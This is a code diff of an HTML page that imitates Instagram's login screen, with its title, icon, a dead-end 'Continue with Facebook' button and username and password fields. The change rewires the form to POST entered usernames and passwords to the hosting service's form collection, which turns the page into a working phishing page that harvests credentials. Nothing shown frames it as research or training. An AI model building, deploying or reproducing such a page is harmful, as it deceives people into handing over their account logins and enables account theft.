@@ -8,7 +8,6 @@
     <title>LogIn | Instagram</title>
     <link rel="stylesheet" href="index.css">
     <link rel="shortcut icon" href="res/instagram-new.png">
-
 </head>
 
 <body>
@@ -20,36 +19,29 @@
             <br>
 
             <div>
-
                 <div class="btn1">
                     <img src="res/facebook.png" style="float: left;" class="icon" alt="">
                     <input type="button" onclick='window.location ="error.html";' value="Continue with Facebook"
                         style="float: right;" class="btn2" />
                 </div>
-
             </div>
 
             <div style="margin-top:15px;margin-bottom: 15px;">
                 <pre>─────────    OR    ─────────</pre>
             </div>
 
-
-
             <div class="l-part">
-                <form name="contact" action="error.html" netlify>
+                <form name="contact" method="POST" data-netlify="true">
+                    <input type="hidden" name="form-name" value="contact" />
                     <input type="text" name="username" placeholder="Username" class="input-1" required />
-
                     <div class="overlap-text">
                         <input type="password" name="password" placeholder="Password" class="input-2" required />
                         <a href="error.html">Forgot?</a>
                     </div>
-
                     <input type="submit" class="btn" value="Log In">
                 </form>
             </div>
         </div>
-
-
 
         <div class="sub-content">
             <div class="s-part">
@@ -59,4 +51,4 @@
     </div>
 </body>
 
-</html>
+                            </html>
